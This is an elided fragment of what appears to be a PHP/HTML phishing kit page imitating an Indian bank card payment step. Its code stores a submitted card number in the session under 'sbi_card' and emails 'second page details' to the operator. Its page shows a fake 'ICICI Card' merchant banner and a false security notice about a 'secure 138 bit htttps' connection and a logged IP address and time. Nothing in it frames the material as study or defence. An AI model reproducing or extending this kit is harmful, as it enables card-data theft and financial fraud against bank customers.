  ...
  if(isset($submit))
    { 
      $_SESSION['sbi_card'] = $c_number;
                ...
                $mail->isHTML(true);
                $mail->Subject   = 'second page details';
...
<head>
    ...
    <link type="text/css" rel="stylesheet" href="css/pace-white.css" />
...
<body>
                ...
                <div class="row">
                    ...
                    <div class="col-md-8 col-xs-12">
                        <div class="row firstrow">
                              <div class="col-md-12 text-center bordermarc"><p class="pera">Merchant Name : <b>ICICI Card</b></p></div>
    ...
    <div id="secureSection" class="container">
              <div class="row"><br>
                  <div class="col-md-12"><p style="font-size: 14px; color: #000; text-align: center;">Your transaction is processed through a secure 138 bit htttps internet connection based on secure socket layer technology. For security purposes, Your address <strong style="color: #144876;" class="text-info">182.68.207.31</strong> and access
                      time <strong class="text-info" style="color: #144876;"><!-- Nov 13 12:20:53 --> <?=date("M d h:i:s")?> IST <?=date("yy")?></strong> have been logged.</p> 
                    </div>
              </div>
              <div class="row">
